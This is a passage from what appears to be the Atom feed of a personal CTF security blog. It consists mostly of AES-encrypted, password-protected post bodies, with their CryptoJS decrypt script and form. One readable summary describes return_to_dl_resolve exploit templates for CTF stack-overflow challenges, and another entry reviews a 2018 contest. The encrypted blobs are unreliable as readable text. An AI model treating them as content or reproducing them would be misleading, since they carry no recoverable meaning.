4hLMQytFPjPJZs0Xtxg3EWxbyVTw9ov4RKemdPtjsIdRR07M5sTeaF2/Hgm3ougb8TK0P712POqxORIwKc0pcNh24ntum6T6+Ok5UJNO6os1AnraXA4FLnwnEEUJm97FlVYCSo5BNuCeXzhEjcY+4lLKyTv3xeJVNajbQyKVuWelR51PtKLMabm776+DqajHFFmDhywpAMyqhZPNN4hpsy0SYWwbRqJScxyzhHmDom5qnqVNffQ9U=</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;比赛中常常会遇到基础栈溢出类的题（并且开启ASLR+DEP），写这篇文章的目的主要是构造&lt;code&gt;return_to_dl_resolve&lt;/code&gt;技术的32位与64位模板，再遇到类似的栈溢出题目时，就不必再绕很大的圈子做了，直接秒了即可。&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2018_807个人赛复盘</title>
    <link href="https://winter3un.github.io/2018/08/07/20180807/"/>
    <id>https://winter3un.github.io/2018/08/07/20180807/</id>
    <published>2018-08-08T03:39:09.000Z</published>
    <updated>2018-08-11T13:40:27.781Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);showMessage('嘿！芝麻开门~~', 5000);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">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